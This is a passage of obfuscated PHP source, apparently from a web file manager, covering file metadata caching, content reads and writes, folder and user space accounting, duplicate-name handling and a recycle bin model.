$±úı¦ ù); $this->sourceCacheClear($°›°ê‡ƒ); $this->setNamePinyin($°›°ê‡ƒ, $±ğê¿—[$şäÖ¸ûÜ[28]], !1); $this->updateModifyTime($ö¶µñÙ¢[$şäÖ¸ûÜ[492]]); $ş£€ªïâ = $this->where(array($şäÖ¸ûÜ[412] => $°›°ê‡ƒ))->data($±ğê¿—)->save(); $¼·óÌ¼È = $şäÖ¸ûÜ[2020] . $ö¶µñÙ¢[$şäÖ¸ûÜ[492]]; if (isset(self::$cacheChildList[$¼·óÌ¼È])) { unset(self::$cacheChildList[$¼·óÌ¼È]); } return $ş£€ªïâ; } public function setNamePinyin($õ–œï®, $¤èà¿Şä, $¥Ÿ›‚¢ê = true) { $˜£ûçÖş =& $_SERVER[ÏÒ Ì„]; $á©õÇÖï = Input::check($¤èà¿Şä, $˜£ûçÖş[581]); $»ŸÏç¦ç = array($˜£ûçÖş[436] => KodSort::makeStr($¤èà¿Şä)); if ($á©õÇÖï) { $»ŸÏç¦ç[$˜£ûçÖş[458]] = str_replace($˜£ûçÖş[50], $˜£ûçÖş[33], Pinyin::get($¤èà¿Şä)); $»ŸÏç¦ç[$˜£ûçÖş[457]] = Pinyin::get($¤èà¿Şä, $˜£ûçÖş[582]); } if (!$¥Ÿ›‚¢ê && !$á©õÇÖï) { $»ŸÏç¦ç[$˜£ûçÖş[458]] = null; $»ŸÏç¦ç[$˜£ûçÖş[457]] = null; } $this->metaSet($õ–œï®, $»ŸÏç¦ç); } public function getContent($ïÉŠ€Æ´) { $ÕÔæÕæ =& $_SERVER[ÏÒ Ì„]; $³Ì´æ„× = $this->fileInfoGet($ïÉŠ€Æ´); if (!$³Ì´æ„×) { return !1; } if ($³Ì´æ„×[$ÕÔæÕæ[78]] == 0) { return $ÕÔæÕæ[33]; } $ğÖùŞÕŒ = $ÕÔæÕæ[2034] . $³Ì´æ„×[$ÕÔæÕæ[170]]; if ($³Ì´æ„×[$ÕÔæÕæ[78]] <= 1024 * 10) { $Û•üÓ¬È = Cache::get($ğÖùŞÕŒ); if (!$Û•üÓ¬È) { $Û•üÓ¬È = IO::getContent($³Ì´æ„×[$ÕÔæÕæ[76]]); Cache::set($ğÖùŞÕŒ, $Û•üÓ¬È); } return $Û•üÓ¬È; } if (!$³Ì´æ„×[$ÕÔæÕæ[76]]) { return $ÕÔæÕæ[33]; } return IO::getContent($³Ì´æ„×[$ÕÔæÕæ[76]]); } public function setDesc($°êèºÚ, $İÌ«À‘Ø) { $ôÑ±°Æü =& $_SERVER[ÏÒ Ì„]; Model($ôÑ±°Æü[558])->eventAddDesc($°êèºÚ, $İÌ«À‘Ø); return $this->metaSet($°êèºÚ, $ôÑ±°Æü[445], $İÌ«À‘Ø); } public function setContent($Å³Ò™”¼, $ú½Ù®üÎ = '') { $ˆ¶“ßÖª =& $_SERVER[ÏÒ Ì„]; $ïÁ¤İ”¾ = $this->sourceInfo($Å³Ò™”¼); $Òú†‚´è = $this->fileInfoGet($Å³Ò™”¼); if (!$Òú†‚´è || !$ïÁ¤İ”¾) { return !1; } $áŠ»µè = Model($ˆ¶“ßÖª[464])->addFileByContent($ú½Ù®üÎ, $ïÁ¤İ”¾[$ˆ¶“ßÖª[28]]); $ø²‰ÄÇ® = $this->fileHistory($ïÁ¤İ”¾, $áŠ»µè[$ˆ¶“ßÖª[461]], $áŠ»µè[$ˆ¶“ßÖª[78]]); if (!$ø²‰ÄÇ®) { return Model($ˆ¶“ßÖª[464])->remove($áŠ»µè[$ˆ¶“ßÖª[461]]); } $this->folderSizeReset($ïÁ¤İ”¾[$ˆ¶“ßÖª[492]]); return !0; } public function fileSubstr($ûÍØÒ¶, $“”•³, $Ù¹€·¸) { $ôüÑˆ®“ = $this->fileInfoGet($ûÍØÒ¶); if (!$ôüÑˆ®“) { return !1; } return IO::fileSubstr($ôüÑˆ®“[$_SERVER[ÏÒ Ì„][76]], $“”•³, $Ù¹€·¸); } public function fileInfoGet($èí—»¡„) { $×ˆ ¶Ìû =& $_SERVER[ÏÒ Ì„]; $Š¶šü = $this->sourceInfo($èí—»¡„); if (!$Š¶šü || $Š¶šü[$×ˆ ¶Ìû[405]]) { return !1; } $ê‚¾’•Œ = $×ˆ ¶Ìû[467] . $Š¶šü[$×ˆ ¶Ìû[461]]; $ö”™²ü€ = _get(self::$cacheFileInfo, $ê‚¾’•Œ); if ($ö”™²ü€) { return $ö”™²ü€; } $”éò©±™ = Model($×ˆ ¶Ìû[464])->fileInfo($Š¶šü[$×ˆ ¶Ìû[461]]); if ($”éò©±™) { $”éò©±™[$×ˆ ¶Ìû[28]] = $Š¶šü[$×ˆ ¶Ìû[28]]; } self::$cacheFileInfo[$ê‚¾’•Œ] = $”éò©±™; return $”éò©±™; } private function folderChildrenNumber($¯Ä£î¨Ñ) { $áôó‚€ú =& $_SERVER[ÏÒ Ì„]; $ØŸÑ”ñ = $this->sourceInfo($¯Ä£î¨Ñ); $³ÓÑšì¢ = array($áôó‚€ú[578] => array($áôó‚€ú[538], $ØŸÑ”ñ[$áôó‚€ú[515]] . $¯Ä£î¨Ñ . $áôó‚€ú[539]), $áôó‚€ú[424] => intval($ØŸÑ”ñ[$áôó‚€ú[425]]), $áôó‚€ú[571] => 1); $½¸É€§‚ = $this->where($³ÓÑšì¢)->count(); $‰•Ñïï = $this->where($³ÓÑšì¢)->where(array($áôó‚€ú[571] => 0))->count(); return array($áôó‚€ú[82] => $‰•Ñïï, $áôó‚€ú[83] => $½¸É€§‚); } public function pathInfo($ë§÷È², $·²›®¼• = false) { $ŞÒ³Óùô =& $_SERVER[ÏÒ Ì„]; $·²›®¼• = !1; $ë§÷È² = intval($ë§÷È²); $°®ÇäÍ = $ŞÒ³Óùô[453] . intval($·²›®¼•) . $ŞÒ³Óùô[454] . $ë§÷È²; $çÜ¦É÷” = _get(self::$cachePathInfo, $°®ÇäÍ); if ($çÜ¦É÷”) { return $çÜ¦É÷”; } $‰ÇµÈÍ = $this->sourceInfo($ë§÷È²); if (!$‰ÇµÈÍ) { return !1; } $‰ÇµÈÍ = $this->_listDataApplyItem($‰ÇµÈÍ, $·²›®¼•); self::$cachePathInfo[$°®ÇäÍ] = $‰ÇµÈÍ; return $‰ÇµÈÍ; } public static $cachePathInfoMore = array(); public function pathInfoMore($İ¥‹¤Ã”) { $˜÷ğ®Ì =& $_SERVER[ÏÒ Ì„]; $ôúğš£§ = _get(self::$cachePathInfoMore, $İ¥‹¤Ã”); if ($ôúğš£§) { return $ôúğš£§; } $«¶Â¤Ì” = $this->pathInfo($İ¥‹¤Ã”); if (!$«¶Â¤Ì”) { return !1; } if ($«¶Â¤Ì”[$˜÷ğ®Ì[405]] == $˜÷ğ®Ì[87]) { $«¶Â¤Ì”[$˜÷ğ®Ì[81]] = $this->folderChildrenNumber($İ¥‹¤Ã”); } self::$cachePathInfoMore[$İ¥‹¤Ã”] = $«¶Â¤Ì”; return $«¶Â¤Ì”; } public function sourceInfo($ÅÏÎõ¢) { $¿È—Á÷Ş =& $_SERVER[ÏÒ Ì„]; if (!$ÅÏÎõ¢) { return array(); } $ÅÏÎõ¢ = intval($ÅÏÎõ¢); $á†ìšÇ¥ = $¿È—Á÷Ş[452] . $ÅÏÎõ¢; $¼ƒ«ªÅ = _get(self::$cacheSourceInfo, $á†ìšÇ¥); if ($¼ƒ«ªÅ) { return $¼ƒ«ªÅ; } $«§€×µ¬ = $this->where(array($¿È—Á÷Ş[397] => $ÅÏÎõ¢))->find(); self::$cacheSourceInfo[$á†ìšÇ¥] = $«§€×µ¬; return self::$cacheSourceInfo[$á†ìšÇ¥]; } public function sourceCacheClear($éùì°Ú† = false) { self::cacheClear($éùì°Ú†); } public static function cacheClear($ıØŒ«Ï¸ = false) { $½…õıÀ† =& $_SERVER[ÏÒ Ì„]; if ($ıØŒ«Ï¸ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$½…õıÀ†[452] . $ıØŒ«Ï¸]); unset(self::$cachePathInfoMore[$ıØŒ«Ï¸]); unset(self::$cachePathInfo[$½…õıÀ†[2035] . $ıØŒ«Ï¸]); unset(self::$cachePathInfo[$½…õıÀ†[2036] . $ıØŒ«Ï¸]); } public function metaSet($·ş™”ãª, $Â­—è¼ = null, $â³’ß²· = null) { $ ÂÈáÈ… = parent::metaSet($·ş™”ãª, $Â­—è¼, $â³’ß²·); if ($ ÂÈáÈ…) { $this->sourceCacheClear($·ş™”ãª); } return $ ÂÈáÈ…; } public function pathInfoByPath($ö™ ñ—, $¼ó–Ş”„) { $Çùˆª® =& $_SERVER[ÏÒ Ì„]; $Éüú¼“à = !$¼ó–Ş”„ ? array() : explode($Çùˆª®[8], trim($¼ó–Ş”„, $Çùˆª®[8])); $ªäÂÏ¿â = $ö™ ñ—; foreach ($Éüú¼“à as $×¥¤“Úş) { $¦¿àÁ€ = array($Çùˆª®[492] => $ªäÂÏ¿â, $Çùˆª®[28] => $×¥¤“Úş); $÷«¨€°® = $this->where($¦¿àÁ€)->select(); if (!$÷«¨€°®) { return !1; } $÷«¨€°® = array_sort_by($÷«¨€°®, $Çùˆª®[425]); $ªäÂÏ¿â = $÷«¨€°®[0][$Çùˆª®[397]]; } return $this->pathInfo($ªäÂÏ¿â, !0); } protected function updateModifyTime($Éš­„Ñ) { $å¥íµ¡„ =& $_SERVER[ÏÒ Ì„]; $Ÿä¦ˆòÚ = defined($å¥íµ¡„[468]) ? USER_ID : $å¥íµ¡„[191]; if (!$Éš­„Ñ) { return; } if (!is_array($Éš­„Ñ)) { $Éš­„Ñ = array($Éš­„Ñ); } foreach ($Éš­„Ñ as $ïÊöÅÑ => $™éÎ§Û¬) { $Éš­„Ñ[$ïÊöÅÑ] = intval($™éÎ§Û¬); $this->sourceCacheClear($™éÎ§Û¬); } $²•ƒû­ˆ = array($å¥íµ¡„[397] => array($å¥íµ¡„[7], $Éš­„Ñ)); $„œ³´à’ = array($å¥íµ¡„[577] => $Ÿä¦ˆòÚ, $å¥íµ¡„[419] => time()); $this->where($²•ƒû­ˆ)->save($„œ³´à’); } public function folderSizeReset($µàñ¼³Ÿ, $¤¶»ÊØ¦ = false) { $á´Ø°Ò³ =& $_SERVER[ÏÒ Ì„]; if ($this->statusIgnoreResetSpace) { return; } $õ’òòçÌ = $this->sourceInfo($µàñ¼³Ÿ); $á¶ÚÖü¶ = $á´Ø°Ò³[2037] . $µàñ¼³Ÿ; CacheLock::lock($á¶ÚÖü¶, 20); if ($¤¶»ÊØ¦ === !1) { $this->sourceCacheClear($µàñ¼³Ÿ); $õ’òòçÌ = $this->sourceInfo($µàñ¼³Ÿ); $íÍ“‘©Ù = array($á´Ø°Ò³[396] => $µàñ¼³Ÿ, $á´Ø°Ò³[424] => 0); $¸¹÷ø‚ú = $this->where($íÍ“‘©Ù)->sum($á´Ø°Ò³[78]); $¤¶»ÊØ¦ = intval($¸¹÷ø‚ú) - intval($õ’òòçÌ[$á´Ø°Ò³[78]]); } if ($¤¶»ÊØ¦ == 0) { return CacheLock::unlock($á¶ÚÖü¶); } $­Ò¢åø = $this->parentLevelArray($õ’òòçÌ[$á´Ø°Ò³[515]]); if (!$­Ò¢åø) { $­Ò¢åø = array(); } $­Ò¢åø[] = $õ’òòçÌ[$á´Ø°Ò³[397]]; $íÍ“‘©Ù = array($á´Ø°Ò³[397] => array($á´Ø°Ò³[413], $­Ò¢åø)); if ($¤¶»ÊØ¦ < 0) { $íÍ“‘©Ù[$á´Ø°Ò³[78]] = array($á´Ø°Ò³[1009], abs($¤¶»ÊØ¦)); } $this->where($íÍ“‘©Ù)->setAdd($á´Ø°Ò³[78], $¤¶»ÊØ¦); CacheLock::unlock($á¶ÚÖü¶); $¿á‘ãÅÄ = $á´Ø°Ò³[2038] . $õ’òòçÌ[$á´Ø°Ò³[406]] . $á´Ø°Ò³[4] . $õ’òòçÌ[$á´Ø°Ò³[498]]; $ñ—š”’‰ = array($õ’òòçÌ[$á´Ø°Ò³[406]], $õ’òòçÌ[$á´Ø°Ò³[498]]); TaskRun::timeLimitCall($¿á‘ãÅÄ, $á´Ø°Ò³[2039], $ñ—š”’‰, 1.5); } public function folderSizeResetChildren($Í’¶¡¿˜) { $‹Åüå° =& $_SERVER[ÏÒ Ì„]; $this->sourceCacheClear($Í’¶¡¿˜); $º©ÄŠ‰ = $this->sourceInfo($Í’¶¡¿˜); $ªá“Ñê = array($‹Åüå°[571] => 1, $‹Åüå°[578] => array($‹Åüå°[538], $º©ÄŠ‰[$‹Åüå°[515]] . $Í’¶¡¿˜ . $‹Åüå°[539])); $Å´™íÒò = $‹Åüå°[2040]; $Åé² = $this->field($Å´™íÒò)->where($ªá“Ñê)->select(); $ªá“Ñê[$‹Åüå°[405]] = 0; $ëÛ¬ñÇ° = $this->field($Å´™íÒò)->where($ªá“Ñê)->select(); if (!$ëÛ¬ñÇ°) { return; } $Åé²[] = $º©ÄŠ‰; $Åé² = array_to_keyvalue($Åé², $‹Åüå°[397]); foreach ($Åé² as $†³ˆ‹Ô => $ƒˆ¹œ º) { $Åé²[$†³ˆ‹Ô][$‹Åüå°[2041]] = $Åé²[$†³ˆ‹Ô][$‹Åüå°[78]]; $Åé²[$†³ˆ‹Ô][$‹Åüå°[78]] = 0; } foreach ($ëÛ¬ñÇ° as $ƒˆ¹œ º) { $¢·È¹¬¶ = $ƒˆ¹œ º[$‹Åüå°[492]] . $‹Åüå°[33]; if (!isset($Åé²[$¢·È¹¬¶])) { continue; } if ($ƒˆ¹œ º[$‹Åüå°[425]] == $Åé²[$¢·È¹¬¶][$‹Åüå°[425]]) { $Åé²[$¢·È¹¬¶][$‹Åüå°[78]] += $ƒˆ¹œ º[$‹Åüå°[78]]; } } foreach ($Åé² as $ƒˆ¹œ º) { $Ãåˆ”Ëë = $this->parentLevelArray($ƒˆ¹œ º[$‹Åüå°[515]]); foreach ($Ãåˆ”Ëë as $¢·È¹¬¶) { $¢·È¹¬¶ = $¢·È¹¬¶ . $‹Åüå°[33]; if (!isset($Åé²[$¢·È¹¬¶])) { continue; } if ($ƒˆ¹œ º[$‹Åüå°[425]] == $Åé²[$¢·È¹¬¶][$‹Åüå°[425]]) { $Åé²[$¢·È¹¬¶][$‹Åüå°[78]] += $ƒˆ¹œ º[$‹Åüå°[78]]; } } } $«ÁõªóÒ = array(); foreach ($Åé² as $ƒˆ¹œ º) { if ($ƒˆ¹œ º[$‹Åüå°[78]] == $ƒˆ¹œ º[$‹Åüå°[2041]]) { continue; } $«ÁõªóÒ[] = array($‹Åüå°[397], $ƒˆ¹œ º[$‹Åüå°[397]], $‹Åüå°[78], $ƒˆ¹œ º[$‹Åüå°[78]]); } $this->saveAll($«ÁõªóÒ); } public function userSpaceReset($õÎ‘©©š = false) { $±áÅ£°ô =& $_SERVER[ÏÒ Ì„]; $¿á¯¨¸Ş = $this->where(array($±áÅ£°ô[406] => self::TYPE_USER, $±áÅ£°ô[498] => $õÎ‘©©š, $±áÅ£°ô[405] => 0))->sum($±áÅ£°ô[78]); $¿á¯¨¸Ş = !$¿á¯¨¸Ş || $¿á¯¨¸Ş <= 0 ? 0 : $¿á¯¨¸Ş; Model($±áÅ£°ô[507])->userEdit($õÎ‘©©š, array($±áÅ£°ô[1734] => $¿á¯¨¸Ş)); } public function targetSpaceUpdate($û®Êı•, $å‰‡ˆä) { $ÑÎêùİ =& $_SERVER[ÏÒ Ì„]; if (!$å‰‡ˆä) { return; } if (!in_array($û®Êı•, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ÓœïÉûˆ = $this->targetSpaceSize($û®Êı•, $å‰‡ˆä); if ($û®Êı• == self::TYPE_USER) { Model($ÑÎêùİ[507])->userEdit($å‰‡ˆä, array($ÑÎêùİ[1734] => $ÓœïÉûˆ)); } else { if ($û®Êı• == self::TYPE_GROUP) { Model($ÑÎêùİ[516])->groupEdit($å‰‡ˆä, array($ÑÎêùİ[1734] => $ÓœïÉûˆ)); } } } public function targetSpaceSize($‹íÂ–š…, $ÔüìŞ«) { $Ó—¥Ğ§Â =& $_SERVER[ÏÒ Ì„]; $Á“ƒûæ½ = $this->sourceRoot($‹íÂ–š…, $ÔüìŞ«, !0); if (!$Á“ƒûæ½) { return 0; } $¥îëû×¦ = floatval($Á“ƒûæ½[$Ó—¥Ğ§Â[78]]); $—Á Ûß© = array($Ó—¥Ğ§Â[578] => array($Ó—¥Ğ§Â[538], $Ó—¥Ğ§Â[525] . $Á“ƒûæ½[$Ó—¥Ğ§Â[397]] . $Ó—¥Ğ§Â[539])); $ÑØ‰Ì½¨ = Model($Ó—¥Ğ§Â[423])->field($Ó—¥Ğ§Â[412])->where($—Á Ûß©)->select(); $ÑØ‰Ì½¨ = array_to_keyvalue($ÑØ‰Ì½¨, $Ó—¥Ğ§Â[33], $Ó—¥Ğ§Â[397]); $ÑØ‰Ì½¨ = array_unique(array_filter($ÑØ‰Ì½¨)); if ($ÑØ‰Ì½¨) { $—Á Ûß© = array($Ó—¥Ğ§Â[412] => array($Ó—¥Ğ§Â[413], $ÑØ‰Ì½¨)); $¥îëû×¦ += floatval($this->where($—Á Ûß©)->sum($Ó—¥Ğ§Â[78])); } $¥îëû×¦ = !$¥îëû×¦ || $¥îëû×¦ <= 0 ? 0 : $¥îëû×¦; return $¥îëû×¦; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¿œïĞœ¯) { return $this->fileTypeProfile($¿œïĞœ¯, SourceModel::TYPE_USER); } public function groupFileTypeProfile($‹ÊæüÍ) { return $this->fileTypeProfile($‹ÊæüÍ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($½Úìˆıè, $ğ¿Ò‰®Ö) { $Ø‹öŞ =& $_SERVER[ÏÒ Ì„]; $¨˜“’á¸ = $Ø‹öŞ[2042] . $½Úìˆıè . $Ø‹öŞ[71] . $ğ¿Ò‰®Ö; $ôîÎˆ×ú = Cache::get($¨˜“’á¸); if ($ôîÎˆ×ú) { return $ôîÎˆ×ú; } $Ñé½‚€  = array($Ø‹öŞ[571] => 0); if ($½Úìˆıè != !1) { $Ñé½‚€ [$Ø‹öŞ[498]] = $½Úìˆıè; $Ñé½‚€ [$Ø‹öŞ[406]] = $ğ¿Ò‰®Ö; } $Ûı£ó© = array(); $Ûı£ó©[$Ø‹öŞ[2043]] = array($Ø‹öŞ[2044] => LNG($Ø‹öŞ[2043]), $Ø‹öŞ[2045] => $this->where($Ñé½‚€ )->count(), $Ø‹öŞ[573] => $this->where($Ñé½‚€ )->sum($Ø‹öŞ[78])); $€„Ô‚öû = KodIO::fileTypeList(); foreach ($€„Ô‚öû as $ß˜êØ©Õ => $ò–ìâÑÕ) { $Ñé½‚€ [$Ø‹öŞ[407]] = $this->fileTypeWhere($ß˜êØ©Õ); $Ûı£ó©[$ß˜êØ©Õ] = array($Ø‹öŞ[2044] => $ò–ìâÑÕ[$Ø‹öŞ[28]], $Ø‹öŞ[2045] => $this->where($Ñé½‚€ )->count(), $Ø‹öŞ[573] => $this->where($Ñé½‚€ )->sum($Ø‹öŞ[78])); } Cache::set($¨˜“’á¸, $Ûı£ó©, 1200); return $Ûı£ó©; } public function fileNameExist($š®ØğÏĞ, $Î´€Ûùï) { $ÀØ¬ï“¨ =& $_SERVER[ÏÒ Ì„]; $Ã¿‹ø = $this->where(array($ÀØ¬ï“¨[492] => $š®ØğÏĞ, $ÀØ¬ï“¨[28] => $Î´€Ûùï, $ÀØ¬ï“¨[425] => 0))->find(); return is_array($Ã¿‹ø) ? $Ã¿‹ø[$ÀØ¬ï“¨[397]] : !1; } public function childList($ø×Î®÷Û) { $ìô†ıºÀ =& $_SERVER[ÏÒ Ì„]; $ä€Ş˜ê‹ = $ìô†ıºÀ[2020] . $ø×Î®÷Û; if (isset(self::$cacheChildList[$ä€Ş˜ê‹])) { return self::$cacheChildList[$ä€Ş˜ê‹]; } $å²Ö¹ê = array($ìô†ıºÀ[492] => intval($ø×Î®÷Û), $ìô†ıºÀ[425] => 0); $Õ¾˜õÔ = $this->where($å²Ö¹ê)->select(); $Õ¾˜õÔ = $Õ¾˜õÔ ? $Õ¾˜õÔ : array(); self::$cacheChildList[$ä€Ş˜ê‹] = $Õ¾˜õÔ; foreach ($Õ¾˜õÔ as $È¼ãÍˆ™) { $ä€Ş˜ê‹ = $ìô†ıºÀ[452] . $È¼ãÍˆ™[$ìô†ıºÀ[397]]; self::$cacheSourceInfo[$ä€Ş˜ê‹] = $È¼ãÍˆ™; } return $Õ¾˜õÔ; } public function fileNameAuto($î¨È, $ÌåÃ’°, $ÄŸÙö¾Ú = REPEAT_RENAME, $éÂ¢³„æ = false) { $©Ü¤²÷¬ =& $_SERVER[ÏÒ Ì„]; $È±¤šÇÁ = array($©Ü¤²÷¬[492] => $î¨È, $©Ü¤²÷¬[425] => 0, $©Ü¤²÷¬[28] => array($©Ü¤²÷¬[381], $ÌåÃ’° . $©Ü¤²÷¬[382])); $ÛÇç£–Ä = $this->field($©Ü¤²÷¬[28])->where($È±¤šÇÁ)->select(); $§–ø¹Ç = array_to_keyvalue($ÛÇç£–Ä, $©Ü¤²÷¬[33], $©Ü¤²÷¬[28]); return $this->fileNameAutoGet($§–ø¹Ç, $ÌåÃ’°, $ÄŸÙö¾Ú, $éÂ¢³„æ); } public function fileNameAutoGet($Å«¾ñµ‚, $º‰…úµ, $¢Ù¬ëÔ, $Ÿ™¨ì¸ì) { $Ú¯ŒíÛ˜ =& $_SERVER[ÏÒ Ì„]; if ($¢Ù¬ëÔ == REPEAT_REPLACE || !$Å«¾ñµ‚ || !in_array_not_case($º‰…úµ, $Å«¾ñµ‚) || $Ÿ™¨ì¸ì && $¢Ù¬ëÔ != REPEAT_RENAME_FOLDER) { return $º‰…úµ; } if ($¢Ù¬ëÔ == REPEAT_SKIP) { return !1; } $²Ü €ÑÙ = $Ú¯ŒíÛ˜[95] . get_path_ext($º‰…úµ); $²Ü €ÑÙ = $²Ü €ÑÙ == $Ú¯ŒíÛ˜[95] || $Ÿ™¨ì¸ì ? $Ú¯ŒíÛ˜[33] : $²Ü €ÑÙ; for ($›ä÷›‡ò = 1; $›ä÷›‡ò <= count($Å«¾ñµ‚) + 1; $›ä÷›‡ò++) { $»¶–Ü¬ = substr($º‰…úµ, 0, strlen($º‰…úµ) - strlen($²Ü €ÑÙ)); $ğÜ’†ÁÙ = $»¶–Ü¬ . "\x28{$›ä÷›‡ò}\x29{$²Ü €ÑÙ}"; if (!in_array_not_case($ğÜ’†ÁÙ, $Å«¾ñµ‚)) { return $ğÜ’†ÁÙ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\162\143\145\x5f\x72\x65\x63\x79\x63\x6c\x65"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\x54\x69\x6d\145", "\x74\151\155\145", "\x69\156\x73\145\x72\x74", "\x66\x75\156\x63\164\x69\157\x6e")); public function listData($•Ğûè² = false) { $‚£ëıÔ¹ =& $_SERVER[ÏÒ Ì„]; $•Ğûè² = $•Ğûè² ? $•Ğûè² : USER_ID; $ÓÇ•Ñ = $this->where(array($‚£ëıÔ¹[1569] => $•Ğûè²))->select(); return array_to_keyvalue($ÓÇ•Ñ, $‚£ëıÔ¹[33], $‚£ëıÔ¹[397]); } public function moveToRecycle($áº×“²¶) { $ÌÓèÀµ =& $_SERVER[ÏÒ Ì„]; $ğ‰îÇµû = Model($ÌÓèÀµ[1251]); $ı™ò”¸ğ = $ğ‰îÇµû->sourceInfo($áº×“²¶); if (!$ı™ò”¸ğ || $ı™ò”¸ğ[$ÌÓèÀµ[425]] == $ÌÓèÀµ[87]) { return; } $¾ßÙşÁı = array($ÌÓèÀµ[412] => $áº×“²¶, $ÌÓèÀµ[1569] => USER_ID, $ÌÓèÀµ[574] => $ı™ò”¸ğ[$ÌÓèÀµ[406]], $ÌÓèÀµ[575] => $ı™ò”¸ğ[$ÌÓèÀµ[498]], $ÌÓèÀµ[578] => $ı™ò”¸ğ[$ÌÓèÀµ[515]]); $this->add($¾ßÙşÁı); $this->recycleMove($áº×“²¶, 1); if ($ı™ò”¸ğ[$ÌÓèÀµ[405]] == $ÌÓèÀµ[87]) { $ôö¼ÍÇ = array($ÌÓèÀµ[578] => array($ÌÓèÀµ[538], $ı™ò”¸ğ[$ÌÓèÀµ[515]] . $áº×“²¶ . $ÌÓèÀµ[539])); $ğ‰îÇµû->where($ôö¼ÍÇ)->setField($ÌÓèÀµ[425], 1); } } public function clear() { $this->remove(!1); } public function remove($ã’¡õê = false, $›ıìÌğ§ = false) { $ŞÑıÓõ =& $_SERVER[ÏÒ Ì„]; $›ıìÌğ§ = $›ıìÌğ§ ? $›ıìÌğ§ : USER_ID; $Á°Àˆ×Ğ = Model($ŞÑıÓõ[1251]); $É’ÂöŞ” = $this->listData($›ıìÌğ§); $ã’¡õê = $ã’¡õê === !1 ? !1 : $ã’¡õê; $±ö¸ÜŞ = array(); foreach ($É’ÂöŞ” as $ÇÇ—››¯) { if ($ã’¡õê != !1 && !in_array($ÇÇ—››¯, $ã’¡õê)) { continue; } $¹¥ßĞ»À = $Á°Àˆ×Ğ->sourceInfo($ÇÇ—››¯); $Á°Àˆ×Ğ->remove($ÇÇ—››¯, !1); $×Ñµª¨Ò = $¹¥ßĞ»À[$ŞÑıÓõ[406]] . $ŞÑıÓõ[71] . $¹¥ßĞ»À[$ŞÑıÓõ[498]]; $±ö¸ÜŞ[$×Ñµª¨Ò] = array($ŞÑıÓõ[574] => $¹¥ßĞ»À[$ŞÑıÓõ[406]], $ŞÑıÓõ[498] => $¹¥ßĞ»À[$ŞÑıÓõ[498]]); $this->where(array($ŞÑıÓõ[397] => $ÇÇ—››¯))->delete(); } foreach ($±ö¸ÜŞ as $ıÔı†á) { $Á°Àˆ×Ğ->targetSpaceUpdate($ıÔı†á[$ŞÑıÓõ[406]], $ıÔı†á[$ŞÑıÓõ[498]]); } } public function restore($øç½ùï = false) { $•ñàŒáÚ = $this->listData(); $this->_restoreSource($•ñàŒáÚ, $øç½ùï); } public function removeUserAll($Şî÷Èõ½) { $this->remove(!1, $Şî÷Èõ½); } private function _restoreSource($¶†âë¦Æ, $ìì•ú—Ó) { $³šî¼Ş˜ =& $_SERVER[ÏÒ Ì„]; $‰Ìıá¸ = Model($³šî¼Ş˜[1251]); $ìì•ú—Ó = $ìì•ú—Ó == !1 ? !1 : $ìì•ú—Ó; if (!$¶†âë¦Æ) { return !0; } $£™ŞÁ± = array(); foreach ($¶†âë¦Æ as $Ëç¦ñŞª) { if ($ìì•ú—Ó != !1 && !in_array($Ëç¦ñŞª, $ìì•ú—Ó)) { continue; } $ÆØ‰±­¢ = $‰Ìıá¸->sourceInfo($Ëç¦ñŞª); $Å»ìéçî = $‰Ìıá¸->sourceInfo($ÆØ‰±­¢[$³šî¼Ş˜[492]]); if ($Å»ìéçî[$³šî¼Ş˜[425]] == $³šî¼Ş˜[87]) { continue; } $‰Ìıá¸->lockMoveStart($Ëç¦ñŞª); $this->recycleMove($Ëç¦ñŞª, 0); if ($ÆØ‰±­¢[$³šî¼Ş˜[405]] == $³šî¼Ş˜[87]) { $Å‰·°©† = array($³šî¼Ş˜[578] => array($³šî¼Ş˜[538], $ÆØ‰±­¢[$³šî¼Ş˜[515]] . $Ëç¦ñŞª . $³šî¼Ş˜[539])); $‰Ìıá¸->where($Å‰·°©†)->setField($³šî¼Ş˜[425], 0); $this->restoreFolderChildren($Ëç¦ñŞª, $¶†âë¦Æ); } $this->where(array($³šî¼Ş˜[397] => $Ëç¦ñŞª))->delete(); $‰Ìıá¸->folderSizeReset($ÆØ‰±­¢[$³šî¼Ş˜[492]]); $£™ŞÁ±[] = $ÆØ‰±­¢[$³šî¼Ş˜[492]]; if ($ÆØ‰±­¢[$³šî¼Ş˜[405]] == $³šî¼Ş˜[87]) { $£™ŞÁ±[] = $Ëç¦ñŞª; } $‰Ìıá¸->lockMoveEnd($Ëç¦ñŞª); } $‰Ìıá¸->updateModifyTime($£™ŞÁ±); } private function restoreFolderChildren($ÁòãÆ , $Ô¿ˆß„) { $˜ß÷°ò‚ =& $_SERVER[ÏÒ Ì„]; $ùª»ª¿ = Model($˜ß÷°ò‚[1251]); $Êµ´ŒÉÔ = array($˜ß÷°ò‚[397] => array($˜ß÷°ò‚[7], array())); foreach ($Ô¿ˆß„ as $«Â‘ø) { if ($«Â‘ø == $ÁòãÆ ) { continue; } if (!$ùª»ª¿->isParentOf($ÁòãÆ , $«Â‘ø)) { continue; } $ÔÕÔóÄ‹ = $ùª»ª¿->sourceInfo($«Â‘ø); if ($ÔÕÔóÄ‹[$˜ß÷°ò‚[405]] == $˜ß÷°ò‚[87]) { $Êµ´ŒÉÔ[] = array($˜ß÷°ò‚[578] => array($˜ß÷°ò‚[538], $ÔÕÔóÄ‹[$˜ß÷°ò‚[515]] . $«Â‘ø . $˜ß÷°ò‚[539])); } else { $Êµ´ŒÉÔ[$˜ß÷°ò‚[397]][1][] = $«Â‘ø; } } if (!$Êµ´ŒÉÔ[$˜ß÷°ò‚[397]][1]) { unset($Êµ´ŒÉÔ[$˜ß÷°ò‚[397]]); } if (!$Êµ´ŒÉÔ) { return; } $Êµ´ŒÉÔ[$˜ß÷°ò‚[397]][1] = array_unique($Êµ´ŒÉÔ[$˜ß÷°ò‚[397]][1]); $Êµ´ŒÉÔ[$˜ß÷°ò‚[994]] = $˜ß÷°ò‚[1841]; $ùª»ª¿->where($Êµ´ŒÉÔ)->setField($˜ß÷°ò‚[425], 1); } private function recycleMove($¬¦‘â—, $çğ¨¹® = 1) { 